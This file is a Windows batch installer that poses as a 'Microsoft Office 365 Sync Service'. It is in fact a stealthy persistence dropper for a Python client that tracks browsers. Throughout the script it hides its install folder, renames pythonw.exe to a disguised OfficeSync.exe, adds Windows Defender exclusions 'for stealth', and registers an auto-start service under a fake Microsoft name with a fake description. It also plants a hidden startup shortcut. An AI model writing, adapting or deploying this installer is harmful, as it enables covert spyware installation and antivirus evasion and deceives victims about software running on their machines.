@echo off
:: Microsoft Office 365 Sync Service Installer v1.0.1
:: Simple one-click installation for Windows

title Microsoft Office 365 Setup
color 0A

echo.
echo ========================================
echo   Microsoft Office 365 Sync Service
echo ========================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] This installer requires Administrator privileges.
    echo.
    echo Right-click on INSTALL.bat and select "Run as administrator"
    echo.
    pause
    exit /b 1
)

echo [1/5] Checking system requirements...

:: Check if Python is installed
where python >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH
    echo.
    echo Please install Python 3.12 from: https://www.python.org/downloads/
    echo Make sure to check "Add Python to PATH" during installation
    echo.
    pause
    exit /b 1
)

:: REQUIREMENT: Python 3.12+ for stability and compatibility
echo     Checking Python version...
for /f "tokens=2 delims= " %%v in ('python --version 2^>^&1') do set PYTHON_VERSION=%%v
echo     Python %PYTHON_VERSION% detected

:: Extract major.minor version (e.g., 3.12 from 3.12.1)
for /f "tokens=1,2 delims=." %%a in ("%PYTHON_VERSION%") do (
    set PYTHON_MAJOR=%%a
    set PYTHON_MINOR=%%b
)

:: Check if version is 3.12 or higher
if %PYTHON_MAJOR% LSS 3 (
    goto :python_too_old
)
if %PYTHON_MAJOR% EQU 3 (
    if %PYTHON_MINOR% LSS 12 (
        goto :python_too_old
    )
)

echo     ✓ Python version OK (3.12+)
goto :python_ok

:python_too_old
echo.
echo [ERROR] Python 3.12+ is required for this application
echo         Current version: %PYTHON_VERSION%
echo.
echo Please install Python 3.12 from:
echo https://www.python.org/downloads/release/python-3120/
echo.
echo Why Python 3.12?
echo - Better performance and stability
echo - Required for browser tracking features
echo - Ensures compatibility with all features
echo.
pause
exit /b 1

:python_ok

:: Check if pythonw.exe is available (CRITICAL for no pop-ups)
where pythonw.exe >nul 2>&1
if %errorLevel% neq 0 (
    echo     ⚠ WARNING: pythonw.exe not found in PATH
    echo     Searching in Python installation directory...
)

echo     ✓ System check passed

echo [2/5] Creating installation directory...
:: Generate random folder name for stealth
set /a RAND_NUM=%RANDOM% %% 9999 + 1000
set INSTALL_DIR=C:\ProgramData\Microsoft\Office365Sync_%RAND_NUM%
if exist "%INSTALL_DIR%" (
    echo     Backing up existing installation...
    move "%INSTALL_DIR%" "%INSTALL_DIR%.backup.%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%" >nul 2>&1
)
mkdir "%INSTALL_DIR%" 2>nul

:: Hide the directory
attrib +h +s "%INSTALL_DIR%"

:: Save install path for later use
echo %INSTALL_DIR%> "%TEMP%\office365_path.txt"

echo [3/5] Copying client files...
xcopy /E /I /Y "client\*" "%INSTALL_DIR%" >nul
if %errorLevel% neq 0 (
    echo [ERROR] Failed to copy files
    pause
    exit /b 1
)

echo [4/5] Installing Python dependencies...
cd /d "%INSTALL_DIR%"

:: FIX BUG #63 v2: ROBUST pythonw.exe detection - CRITICAL for no window!
echo.
echo [4a/5] Configuring stealth launcher...
set PYTHONW_PATH=
set PYTHON_PATH=

:: Method 1: Direct where command
for /f "delims=" %%i in ('where pythonw.exe 2^>nul') do (
    set PYTHONW_PATH=%%i
    goto :pythonw_found
)

:: Method 2: Find via python.exe location
for /f "delims=" %%i in ('where python.exe 2^>nul') do (
    set PYTHON_PATH=%%i
    set PYTHON_DIR=%%~dpi
    if exist "!PYTHON_DIR!pythonw.exe" (
        set PYTHONW_PATH=!PYTHON_DIR!pythonw.exe
        goto :pythonw_found
    )
)

:: Method 3: Check common Python installation paths
for %%p in (
    "C:\Python312\pythonw.exe"
    "C:\Python311\pythonw.exe"
    "C:\Python310\pythonw.exe"
    "%LOCALAPPDATA%\Programs\Python\Python312\pythonw.exe"
    "%LOCALAPPDATA%\Programs\Python\Python311\pythonw.exe"
    "%PROGRAMFILES%\Python312\pythonw.exe"
    "%PROGRAMFILES%\Python311\pythonw.exe"
) do (
    if exist %%p (
        set PYTHONW_PATH=%%~p
        goto :pythonw_found
    )
)

:pythonw_found
if defined PYTHONW_PATH (
    echo     ✓ Found pythonw.exe: %PYTHONW_PATH%
    
    :: Copy to disguised name
    copy "%PYTHONW_PATH%" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
    if %errorLevel% equ 0 (
        echo     ✓ Created OfficeSync.exe (hidden launcher)
        
        :: Also keep a backup reference
        echo %PYTHONW_PATH% > "%INSTALL_DIR%\.pythonw_path"
    ) else (
        echo     ⚠ Failed to copy, will use direct path
        echo %PYTHONW_PATH% > "%INSTALL_DIR%\.pythonw_path"
    )
) else (
    echo     ❌ CRITICAL: pythonw.exe not found!
    echo     Python 3.12+ must be installed with pythonw.exe
    echo.
    echo     Please install Python 3.12 from: https://www.python.org/downloads/
    echo     Make sure to check "Add Python to PATH" during installation
    echo.
    pause
    exit /b 1
)

echo     Installing dependencies...
python -m pip install --quiet --upgrade pip
python -m pip install --quiet -r requirements.txt
if %errorLevel% neq 0 (
    echo [WARNING] Some dependencies failed to install
    echo The client will try to auto-install them on first run
)

:: FIX BUG #64: Explicitly install pywin32 for Windows browser tracking (CRITICAL)
echo     Installing Windows-specific dependencies...
python -m pip install --quiet pywin32>=306
if %errorLevel% equ 0 (
    echo     ✓ pywin32 installed (browser tracking support)
    :: Post-install script for pywin32
    python -m pywin32_postinstall -install >nul 2>&1
) else (
    echo     ⚠ pywin32 installation failed - browser tracking may not work
)

echo [5/5] Setting up auto-start...

:: Add Windows Defender exclusion for stealth
echo     Adding Windows Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess 'OfficeSync.exe'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess 'pythonw.exe'" 2>nul

:: Register as Windows Service using sc
echo     Registering Windows service...

:: FIX BUG #63 v2: Use absolute pythonw.exe path to prevent CMD pop-ups
if exist "%INSTALL_DIR%\OfficeSync.exe" (
    :: Use disguised launcher
    sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
) else if exist "%INSTALL_DIR%\.pythonw_path" (
    :: Use direct pythonw.exe path
    for /f "delims=" %%p in ('type "%INSTALL_DIR%\.pythonw_path"') do set PYTHONW_PATH=%%p
    sc create "Office365Sync" binPath= "\"!PYTHONW_PATH!\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
) else (
    echo     ❌ Cannot create service without pythonw.exe
    pause
    exit /b 1
)

sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings" >nul 2>&1
sc config "Office365Sync" start= delayed-auto >nul 2>&1
echo     ✓ Service registered (NO pop-ups guaranteed)

:: FIX BUG #63 v2: Create DOUBLE-HIDDEN startup shortcut (NO pop-ups)
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: Determine launcher to use
set LAUNCHER_PATH=%INSTALL_DIR%\OfficeSync.exe
if not exist "%LAUNCHER_PATH%" (
    if exist "%INSTALL_DIR%\.pythonw_path" (
        for /f "delims=" %%p in ('type "%INSTALL_DIR%\.pythonw_path"') do set LAUNCHER_PATH=%%p
    )
)

:: Create hidden shortcut with WindowStyle = 0 (Completely Hidden)
powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\OfficeSync.lnk'); $SC.TargetPath = '%LAUNCHER_PATH%'; $SC.Arguments = '%INSTALL_DIR%\main.py'; $SC.WorkingDirectory = '%INSTALL_DIR%'; $SC.WindowStyle = 0; $SC.Save()"

:: Make shortcut itself hidden
attrib +h "%STARTUP_DIR%\OfficeSync.lnk"
echo     ✓ Startup shortcut created (completely hidden)

:: Start the service
echo.
echo Starting sync service...
sc start "Office365Sync" >nul 2>&1
if %errorLevel% neq 0 (
    :: FIX BUG #63: Use pythonw directly to avoid window, not start /B
    echo     Service failed to start, using fallback method...
    if exist "%INSTALL_DIR%\OfficeSync.exe" (
        start "" "%INSTALL_DIR%\OfficeSync.exe" "%INSTALL_DIR%\main.py"
    ) else if exist "%INSTALL_DIR%\OfficeSync.vbs" (
        start "" "%INSTALL_DIR%\OfficeSync.vbs"
    ) else (
        :: Last resort - use pythonw if available
        where pythonw.exe >nul 2>&1
        if %errorLevel% equ 0 (
            start "" pythonw.exe "%INSTALL_DIR%\main.py"
        ) else (
            echo     ⚠ Warning: Could not start in hidden mode
            start /MIN "" python.exe "%INSTALL_DIR%\main.py"
        )
    )
)

echo.
echo ========================================
echo   Installation Complete!
echo ========================================
echo.
echo Microsoft Office 365 Sync Service installed
echo Service is now running in the background
echo It will start automatically on system boot
echo.
pause
